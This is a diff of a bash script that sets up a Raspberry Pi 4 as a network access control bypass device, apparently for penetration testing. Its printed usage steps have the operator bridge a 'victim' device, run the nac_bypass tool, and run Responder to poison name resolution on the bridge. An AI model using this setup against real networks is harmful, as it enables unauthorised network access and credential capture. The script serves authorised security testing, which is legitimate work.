@@ -1,10 +1,7 @@
 #!/bin/bash
 
-# This script automates the setup of a Wi-Fi hotspot and DHCP server on a Raspberry Pi 4,
+# This script automates the setup of a Raspberry Pi 4 for NAC bypassing
 # based on the guide from https://luemmelsec.github.io/I-got-99-problems-but-my-NAC-aint-one/
-# It also configures SSH for enhanced security, installs the nac_bypass tool,
-# installs the silentbridge tool, sets up a Huawei LTE connection service,
-# and optionally configures an automatic WireGuard VPN connection.
 
 # ANSI Color Codes
 RED='\033[0;31m'
@@ -250,9 +247,6 @@ auto eth0
 EOL
 if [ $? -ne 0 ]; then error_exit "Failed to write $ETH0_CONF."; fi
 echo -e "     ${SUCCESS_EMOJI} ${GREEN}$ETH0_CONF created for hotplug, no IP assigned.${RESET}\n"
-
-
-# The original script would continue here with Step 8.
 
 # --- Step 8: Reload systemd, enable, and restart services ---
 # Adjusted numbering from previous step
@@ -561,7 +555,7 @@ echo -e "${STEP_EMOJI} ${MAGENTA}2. Connect victim (e.g. printer) to eth1 (exter
 echo -e "${STEP_EMOJI} ${MAGENTA}3. Change directory to the nac_bypass tool:${RESET}"
 echo -e "    ${MAGENTA}    cd ${BOLD}$NAC_BYPASS_DIR${RESET}"
 echo -e "${STEP_EMOJI} ${MAGENTA}4. Start the NAC bypass (replace eth0 and eth1 with your actual interface names if different):${RESET}"
-echo -e "    ${MAGENTA}    sudo ./nac_bypass_setup.sh -1 eth0 -2 eth1${RESET}"
+echo -e "    ${MAGENTA}    sudo ./nac_bypass_setup.sh -1 eth0 -2 eth1 -S${RESET}"
 echo -e "    ${INFO_EMOJI} ${BLUE}The script will prompt you to wait. After it completes, you can proceed with your network scan.${RESET}"
 echo -e "    ${INFO_EMOJI} ${BLUE}Remember for Responder, you need to set it up to listen on the bridge interface (br0) and change the answering IP to the victim's IP:${RET}"
 echo -e "    ${MAGENTA}    ./Responder.py -I br0 -e victim.ip${RESET}"
